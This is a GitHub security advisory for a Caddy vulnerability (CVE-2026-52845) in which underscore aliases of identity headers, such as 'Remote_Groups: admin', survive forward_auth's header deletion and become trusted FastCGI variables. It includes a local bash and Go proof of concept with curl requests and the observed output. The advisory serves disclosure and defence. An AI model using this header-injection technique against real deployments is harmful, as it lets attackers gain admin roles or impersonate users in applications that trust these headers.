# [H] Caddy: FastCGI header normalization bypass in `forward_auth copy_headers`

## Summary
Severity: High
Advisory: GHSA-f59h-q822-g45g
CVE: CVE-2026-52845
CWE: CWE-287, CWE-290, CWE-444
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-f59h-q822-g45g
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=0 <2.11.4
- Go: `github.com/caddyserver/caddy` — affected >=0

## Details
### Summary

`forward_auth copy_headers` deletes the exact client-supplied identity header before copying the trusted value from the auth gateway. But when the request later goes through `php_fastcgi`, Caddy normalizes HTTP headers into CGI variables by replacing `-` with `_`.

This lets a client send an underscore alias that survives the `forward_auth` delete step but becomes the same PHP/FastCGI variable:

```text
Remote-Groups  -> HTTP_REMOTE_GROUPS
Remote_Groups  -> HTTP_REMOTE_GROUPS

Remote-User    -> HTTP_REMOTE_USER
Remote_User    -> HTTP_REMOTE_USER
```

Result: a remote client can inject or sometimes override identity/group headers trusted by PHP/FastCGI applications behind Caddy.

### Details

`forward_auth copy_headers` intentionally removes client-controlled headers before setting values from the auth response:

- `modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go:212`
- `modules/caddyhttp/reverseproxy/forwardauth/caddyfile.go:222`

That delete is exact-field deletion through `http.Header.Del()`:

- `modules/caddyhttp/headers/headers.go:255`
- `modules/caddyhttp/headers/headers.go:281`

So deleting `Remote-Groups` does not delete `Remote_Groups`.

Later, FastCGI exports all request headers into CGI variables:

- `modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:410`
- `modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:414`
- `modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go:510`

The normalizer replaces hyphens with underscores:

```go
strings.NewReplacer(" ", "_", "-", "_")
```

So the trusted header and the attacker-controlled alias collide in the backend-visible CGI/PHP namespace.

This is distinct from GHSA-7r4p-vjf4-gxv4. That issue allowed exact copied headers to survive. This report reproduces after the exact-header fix because the bypass uses a different HTTP field name that only becomes equivalent during Caddy's FastCGI export.

### PoC

Run from the Caddy repository root with `bash`:

```bash
set -euo pipefail

tmpdir=$(mktemp -d /tmp/caddy-fastcgi-header-collision.XXXXXX)
mkdir -p "$tmpdir/www"
printf '<?php echo "ok"; ?>\n' > "$tmpdir/www/index.php"

cat > "$tmpdir/servers.go" <<'GO'
package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"net/http/fcgi"
)

func main() {
	go func() {
		mux := http.NewServeMux()
		mux.HandleFunc("/auth", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Remote-User", "alice")
			w.WriteHeader(http.StatusNoContent)
		})
		log.Fatal(http.ListenAndServe("127.0.0.1:19011", mux))
	}()

	ln, err := net.Listen("tcp", "127.0.0.1:19010")
	if err != nil {
		log.Fatal(err)
	}
	log.Fatal(fcgi.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "HTTP_REMOTE_USER=%s\nHTTP_REMOTE_GROUPS=%s\n",
			r.Header.Get("Remote-User"),
			r.Header.Get("Remote-Groups"))
	})))
}
GO

cat > "$tmpdir/Caddyfile" <<EOF
{
	admin off
	auto_https off
	debug
}

:9082 {
	log
	root * $tmpdir/www
	forward_auth 127.0.0.1:19011 {
		uri /auth
		copy_headers Remote-User Remote-Groups
	}
	php_fastcgi 127.0.0.1:19010
}
EOF

cleanup() {
	kill "${caddy_pid:-}" "${servers_pid:-}" 2>/dev/null || true
}
trap cleanup EXIT

go run "$tmpdir/servers.go" >"$tmpdir/servers.log" 2>&1 &
servers_pid=$!

for i in $(seq 1 80); do
	if (echo > /dev/tcp/127.0.0.1/19011) >/dev/null 2>&1 &&
	   (echo > /dev/tcp/127.0.0.1/19010) >/dev/null 2>&1; then
		break
	fi
	sleep 0.25
done

go run ./cmd/caddy run --config "$tmpdir/Caddyfile" --adapter caddyfile >"$tmpdir/caddy.log" 2>&1 &
caddy_pid=$!

for i in $(seq 1 80); do
	if (echo > /dev/tcp/127.0.0.1/9082) >/dev/null 2>&1; then
		break
	fi
	sleep 0.25
done

curl --noproxy '*' -v http://127.0.0.1:9082/index.php
curl --noproxy '*' -v -H 'Remote_Groups: admin' http://127.0.0.1:9082/index.php
cat "$tmpdir/caddy.log"
```

Observed on commit `6c675e29f87cbe7326983ddb6d739175119d394c`:

Baseline:

```text
> GET /index.php HTTP/1.1
< HTTP/1.1 200 OK

HTTP_REMOTE_USER=alice
HTTP_REMOTE_GROUPS=
```

With attacker header:

```text
> GET /index.php HTTP/1.1
> Remote_Groups: admin
< HTTP/1.1 200 OK

HTTP_REMOTE_USER=alice
HTTP_REMOTE_GROUPS=admin
```

Caddy debug log confirms the FastCGI environment contained:

```text
"HTTP_REMOTE_USER": "alice"
"HTTP_REMOTE_GROUPS": "admin"
```

The auth gateway returned `Remote-User: alice` only. It never returned `Remote-Groups`.

### Impact

This affects Caddy deployments that use:

- `forward_auth` with `copy_headers` for identity or authorization headers;
- `php_fastcgi` / FastCGI after the auth check;
- a PHP/FastCGI application that trusts the resulting `HTTP_*` variables.

Impact examples:

- deterministic group/role injection when the auth gateway omits an optional header, e.g. `Remote_Groups: admin` becomes `HTTP_REMOTE_GROUPS=admin`;
- probabilistic user impersonation when both the auth gateway and client provide colliding identity headers, e.g. `Remote-User` and `Remote_User` both map to `HTTP_REMOTE_USER`.

Realistic examples include trusted-header SSO deployments such as Firefly III `remote_user_guard` using `HTTP_REMOTE_USER`, or MediaWiki `Auth_remoteuser` using `HTTP_X_AUTHENTIK_USERNAME`.

## AI disclosure

The LLM was used to help analyze the Caddy codebase, compare relevant code paths, draft the report, and organize reproduction steps. Human security research judgment and insight were used to guide the investigation, validate the root cause, run the local reproduction, assess impact, and make the final report conclusions.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-f59h-q822-g45g
- https://nvd.nist.gov/vuln/detail/CVE-2026-52845
- https://access.redhat.com/security/cve/CVE-2026-52845
- https://bugzilla.redhat.com/show_bug.cgi?id=2491907
- https://github.com/caddyserver/caddy
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-52845.json
